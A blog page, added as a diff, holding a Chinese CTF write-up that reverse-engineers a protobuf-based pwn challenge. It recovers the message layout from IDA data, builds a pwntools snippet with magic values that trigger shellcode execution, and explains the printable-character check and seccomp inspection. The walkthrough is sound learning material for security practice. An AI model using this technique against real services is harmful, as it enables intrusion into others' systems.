@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="viol1t">
+
+
+
+
+
+<title>protobuf-pwn逆向分析与漏洞利用 | viol1t</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">protobuf-pwn逆向分析与漏洞利用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十月 13, 2024&nbsp;&nbsp;15:37:04</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/pwn/">pwn</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>例题来源于源鲁杯第一轮<code>pwn</code>的困难题，向程序发送了<code>msg</code>之后会判定是否符合<code>proto</code>结构，符合则开启沙箱仅允许执行<code>read、write、fstat、alarm、exit_group</code>，并执行<code>msg</code>里的<code>shellcode</code>，<code>shellcode</code>要求范围在可见字符且长度不大于<code>0xc7</code></p>
+<h2 id="protobuf结构体"><a href="#protobuf结构体" class="headerlink" title="protobuf结构体"></a>protobuf结构体</h2><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="protobuf结构体-proto文件示例"><a href="#protobuf结构体-proto文件示例" class="headerlink" title="protobuf结构体&#x2F;proto文件示例"></a>protobuf结构体&#x2F;proto文件示例</h4><p><code>protobuf</code>结构体示例：<code>device.proto</code>，由<code>protobuf</code>版本（<code>proto2 / proto3</code>）和<code>protobuf</code>结构体构成</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">bytes</span>  msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="protobuf参数的结构体定义"><a href="#protobuf参数的结构体定义" class="headerlink" title="protobuf参数的结构体定义"></a>protobuf参数的结构体定义</h4><p><code>protobuf</code>参数的结构体定义如下，其中需要注意的是前四项，在<code>.data.rel.ro</code>段中可以看到每个参数的结构体，根据结构体中的值判断参数类型等信息，从而分析得到<code>protobuf</code>结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>		*name;</span><br><span class="line">	<span class="type">uint32_t</span>		id;</span><br><span class="line">	ProtobufCLabel  label;</span><br><span class="line">	ProtobufCType	type;</span><br><span class="line">	<span class="type">unsigned</span>		quantifier_offset;</span><br><span class="line">	<span class="type">unsigned</span>		offset;</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span>		*descriptor;</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span>		*default_value;</span><br><span class="line">	<span class="type">uint32_t</span>		flags;</span><br><span class="line">	<span class="type">unsigned</span>		reserved_flags;</span><br><span class="line">	<span class="type">void</span>			*reserved2;</span><br><span class="line">	<span class="type">void</span>			*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>以示例中的<code>required sint64 actionid = 1;</code>为例，分别对应结构体前四项：<code>name</code>值为<code>actionid</code>，<code>id</code>值为<code>1</code>，<code>label</code>值为<code>required</code>，<code>type</code>值为<code>sint64</code>，<strong>即在编写<code>proto</code>文件时是按照<code>label type name = id</code>的顺序写的</strong></p>
+<p><code>label</code>存在以下类型，即<code>required</code>、<code>optional</code>、<code>repeated</code>、<code>none</code>，从单词含义也能看出对应什么类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-3</code>，**只有版本为<code>proto2</code>时才需要考虑<code>label</code>**，<code>proto3</code>的<code>label</code>都是<code>none</code>（即数值为<code>3</code>）且不需要在<code>proto</code>文件中写出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">	PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">	PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line">	PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br></pre></td></tr></table></figure>
+
+<p><code>type</code>存在以下类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-0x10</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">	PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">	PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">	PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">	PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">	PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">	PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">	PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">	PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">	PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">	PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">	PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">	PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure>
+
+<h4 id="判定protobuf版本"><a href="#判定protobuf版本" class="headerlink" title="判定protobuf版本"></a>判定protobuf版本</h4><ul>
+<li><p>根据结构体参数数量和实际数量是否一致判断</p>
+<p>在<code>.data.rel.ro</code>段的结构体名下面两项分别是结构体大小和结构体参数数量，<code>proto2</code>比<code>proto3</code>多了<code>default_value</code>字段，所以参数数量会比实际参数数量多一个</p>
+</li>
+<li><p>根据参数结构体有无<code>label</code></p>
+<p><code>proto2</code>中必须声明参数的<code>label</code>，所以<code>label</code>值存在除<code>none</code>（即<code>3</code>）以外的值就是<code>proto2</code></p>
+</li>
+</ul>
+<h4 id="编译proto文件"><a href="#编译proto文件" class="headerlink" title="编译proto文件"></a>编译proto文件</h4><p>使用<code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. filename.proto</code>来编译<code>filename.proto</code>，需要先安装<code>grpcio-tools</code>，编译后得到<code>filename_pb2.py</code>和<code>filename_pb2_grpc.py</code>，编译后在<code>exp</code>中导入<code>filename_pb2</code>即可使用结构体来发送消息</p>
+<p>编译后的结构体会比原结构体多<code>ProtobufCMessage base;</code>，<code>ProtobufCMessage</code>结构体定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessage</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> ProtobufCMessageDescriptor	*descriptor;</span><br><span class="line">	<span class="type">unsigned</span>							n_unknown_fields;</span><br><span class="line">	ProtobufCMessageUnknownField		*unknown_fields;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>所以编译后我们定义的参数在数组中的下标是从<code>3</code>开始的</strong></p>
+<h4 id="使用pbtk获取protobuf结构体"><a href="#使用pbtk获取protobuf结构体" class="headerlink" title="使用pbtk获取protobuf结构体"></a>使用pbtk获取protobuf结构体</h4><p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p>
+<p>使用工具可以快速获取<code>protobuf</code>结构体省去手搓<code>proto</code>文件的麻烦，安装的时候有报错可以直接问<code>gpt</code>解决，但是有的题目被作者刻意隐藏了<code>protobuf</code>特征而无法用工具梭，还是需要手搓</p>
+<h3 id="结构体分析"><a href="#结构体分析" class="headerlink" title="结构体分析"></a>结构体分析</h3><p>在<code>IDA</code>中找到了<code>_data_rel_ro</code>段，<code>name</code>在<code>;</code>右边，下面第一个数值为<code>id</code>，<code>2-5</code>是<code>label</code>，<code>6-9</code>是<code>type</code>，对应枚举中的类型可以得到结构体参数的类型，这里一共有<code>msgid</code>、<code>msgsize</code>、<code>msgcontent</code>三个参数，而<code>qword_3C60</code>结构体名称下面的结构体参数数量也是<code>3</code>，所以<code>protobuf</code>版本为<code>proto3</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>80 _data_rel_ro    segment align_32 public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>80                 assume cs:_data_rel_ro</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>80                 ;org <span class="number">3B</span>80h</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>80 off_3B80        dq offset aMsgid        ; DATA XREF: .data.rel.ro:<span class="number">0000000000003</span>C98↓o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>80                                         ; <span class="string">&quot;msgid&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>88                 db    <span class="number">1</span><span class="meta">#id=1</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>89                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>8A                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>8B                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>8C                 db    <span class="number">3</span><span class="meta">#label=none</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>8D                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>8E                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>8F                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>90                 db    <span class="number">3</span><span class="meta">#type=int64</span></span><br><span class="line">									...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>C8                 dq offset aMsgsize      ; <span class="string">&quot;msgsize&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D0                 db    <span class="number">2</span><span class="meta">#id=2</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D1                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D2                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D3                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D4                 db    <span class="number">3</span><span class="meta">#label=none</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D5                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D6                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D7                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003B</span>D8                 db    <span class="number">3</span><span class="meta">#type=int64</span></span><br><span class="line">									...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C10                 dq offset aMsgcontent   ; <span class="string">&quot;msgcontent&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C18                 db    <span class="number">3</span><span class="meta">#id=3</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C19                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C1A                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C1B                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C1C                 db    <span class="number">3</span><span class="meta">#label=none</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C1D                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C1E                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C1F                 db    <span class="number">0</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C20                 db  <span class="number">0F</span>h<span class="meta">#type=bytes</span></span><br><span class="line">									...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C60 qword_3C60      dq <span class="number">28</span>AAEEF9h            ; DATA XREF: sub_1819+<span class="number">10</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C60                                         ; sub_187D+<span class="number">17</span>↑o ...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C68                 dq offset aBotMsgbot    ; <span class="string">&quot;bot.msgbot&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C70                 dq offset aMsgbot       ; <span class="string">&quot;Msgbot&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C78                 dq offset aBotMsgbot_0  ; <span class="string">&quot;Bot__Msgbot&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C80                 dq offset aBot          ; <span class="string">&quot;bot&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C88                 dq <span class="number">38</span>h#结构体大小</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C90                 dq <span class="number">3</span>#字段数=实际字段数，是proto3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>C98                 dq offset off_3B80      ; <span class="string">&quot;msgid&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CA0                 dq offset unk_20A0</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CA8                 dq <span class="number">1</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CB0                 dq offset unk_20B0</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>CB8                 dq offset sub_1819</span><br><span class="line">									...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D17 _data_rel_ro    ends</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D17</span><br></pre></td></tr></table></figure>
+
+<h3 id="编写和编译proto文件"><a href="#编写和编译proto文件" class="headerlink" title="编写和编译proto文件"></a>编写和编译proto文件</h3><p>根据以上分析编写<code>bot.proto</code> 内容如下</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Msgbot</span>&#123;</span><br><span class="line">    <span class="type">int64</span> msgid = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int64</span> msgsize = <span class="number">2</span>;</span><br><span class="line">    <span class="type">bytes</span> msgcontent = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. bot.proto</code>编译得到<code>bot_pb2.py</code>和<code>bot_pb2_grpc.py</code>，在<code>exp</code>中导入<code>bot_pb2</code>即可使用<code>bot_pb2</code>中的<code>Msgbot</code>来发送题目特定格式的消息，需要注意的是发送前需要先用<code>SerializeToString</code>序列化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bot_pb2 <span class="keyword">import</span> Msgbot</span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line">msg = Msgbot()</span><br><span class="line">msg.msgid = <span class="built_in">id</span></span><br><span class="line">msg.msgsize = size</span><br><span class="line">msg.msgcontent = content</span><br><span class="line">serialized = msg.SerializeToString()</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;botmsg&#x27;</span>, serialized)</span><br></pre></td></tr></table></figure>
+
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>在发送的消息能被正确接收之后当<code>msg[0][3] == (void *)0xC0DEFEEDLL</code>且<code>msg[0][4] == (void *)0xF00DFACELL</code>、<code>msg[0][5] &lt;= 0xC7</code>时将<code>msg[0] + 6</code>复制到<code>dest</code>中作为<code>shellcode</code>执行，<code>msg[0][3]</code>就是<code>msgid</code>，<code>msg[0][4]</code>是<code>msgsize</code>，<code>msg[0] + 6</code>是<code>msgcontent</code>，<code>msg[0][5]</code>获取了<code>msgcontent</code>的长度</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( msg[<span class="number">0</span>][<span class="number">3</span>] == (<span class="type">void</span> *)<span class="number">0xC0DEFEED</span>LL &amp;&amp; msg[<span class="number">0</span>][<span class="number">4</span>] == (<span class="type">void</span> *)<span class="number">0xF00DFACE</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)msg[<span class="number">0</span>][<span class="number">5</span>];</span><br><span class="line">    v1 = msg[<span class="number">0</span>][<span class="number">6</span>];</span><br><span class="line">    check((__int64)v1, v0);</span><br><span class="line">    seccomp((__int64)v1, v0, v2, v3, v4, v5);</span><br><span class="line">    <span class="keyword">if</span> ( msg[<span class="number">0</span>][<span class="number">5</span>] &lt;= (<span class="type">char</span> *)&amp;qword_C0 + <span class="number">7</span> &amp;&amp; v7 &lt;= <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, *((<span class="type">const</span> <span class="type">void</span> **)msg[<span class="number">0</span>] + <span class="number">6</span>), (<span class="type">size_t</span>)msg[<span class="number">0</span>][<span class="number">5</span>]);</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造结构体如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bot_pb2 <span class="keyword">import</span> Msgbot</span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line">msg = Msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = shellcode</span><br><span class="line">serialized = msg.SerializeToString()</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;botmsg&#x27;</span>, serialized)</span><br></pre></td></tr></table></figure>
+
+<p><code>check</code>函数对<code>shellcode</code>进行了检查，限制<code>shellcode</code>在可见字符范围内</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)((<span class="type">int</span>)i + a1) &lt;= <span class="string">&#x27;\x1F&#x27;</span> || *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="string">&#x27;\x7F&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oops!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><p><strong>调试<code>shellcode</code>的时候用<code>si</code>不要用<code>ni</code>！！</strong></p>
+<h3 id="检查沙箱"><a href="#检查沙箱" class="headerlink" title="检查沙箱"></a>检查沙箱</h3><p>通过<code>check</code>之后开启沙箱，所以要执行到发送正确的消息之后才能用<code>seccomp-tools</code>查看沙箱情况，这里可以将<code>process</code>的参数设置为<code>seccomp-tools</code>即<code>r = process([&quot;seccomp-tools&quot;, &quot;dump&quot;, &quot;./pwn&quot;])</code>，发送完<code>msg</code>就会显示沙箱的情况</p>
